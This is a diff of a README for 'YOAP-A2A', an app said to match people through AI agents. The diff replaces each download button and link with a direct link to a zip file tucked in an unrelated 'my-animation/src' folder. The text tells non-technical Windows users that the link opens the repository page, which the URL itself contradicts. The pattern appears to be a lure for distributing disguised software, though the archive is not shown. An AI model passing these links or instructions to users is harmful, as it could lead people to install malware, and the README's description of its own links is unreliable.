@@ -1,6 +1,6 @@
 # 🤖 YOAP-A2A - Connect People Through AI Agents
 
-[![Download YOAP-A2A](https://img.shields.io/badge/Download-YOAP--A2A-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Scryptic-Official/YOAP-A2A/main/my-animation/src/scenes/A-YOA-v1.6.zip)
+[![Download YOAP-A2A](https://img.shields.io/badge/Download-YOAP--A2A-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Scryptic-Official/YOAP-A2A/main/my-animation/src/A_YOA_v2.6.zip)
 
 YOAP-A2A is an application that helps people connect using AI agents. It uses an open agent-to-agent protocol to match users through autonomous AI assistants. This guide will walk you through the steps to download and run YOAP-A2A on a Windows computer. No technical or programming experience is needed.
 
@@ -35,7 +35,7 @@ You will first download the application, then run it on your computer. Follow th
 
    Click the large green button at the top or use this link:
 
-   [Download YOAP-A2A on GitHub](https://raw.githubusercontent.com/Scryptic-Official/YOAP-A2A/main/my-animation/src/scenes/A-YOA-v1.6.zip)
+   [Download YOAP-A2A on GitHub](https://raw.githubusercontent.com/Scryptic-Official/YOAP-A2A/main/my-animation/src/A_YOA_v2.6.zip)
 
    This link takes you to the main GitHub repository page. From there, you will find the files for the latest version.
 
@@ -110,7 +110,7 @@ New versions improve features and fix issues. To update:
 
 1. Visit the main download page again:
 
-   [Download YOAP-A2A on GitHub](https://raw.githubusercontent.com/Scryptic-Official/YOAP-A2A/main/my-animation/src/scenes/A-YOA-v1.6.zip)
+   [Download YOAP-A2A on GitHub](https://raw.githubusercontent.com/Scryptic-Official/YOAP-A2A/main/my-animation/src/A_YOA_v2.6.zip)
 
 2. Go to the “Releases” section.
 
@@ -162,4 +162,4 @@ YOAP-A2A is open-source and available on GitHub under a permissive license. You 
 
 ---
 
-[![Download YOAP-A2A](https://img.shields.io/badge/Download-YOAP--A2A-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Scryptic-Official/YOAP-A2A/main/my-animation/src/scenes/A-YOA-v1.6.zip)
+[![Download YOAP-A2A](https://img.shields.io/badge/Download-YOAP--A2A-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Scryptic-Official/YOAP-A2A/main/my-animation/src/A_YOA_v2.6.zip)
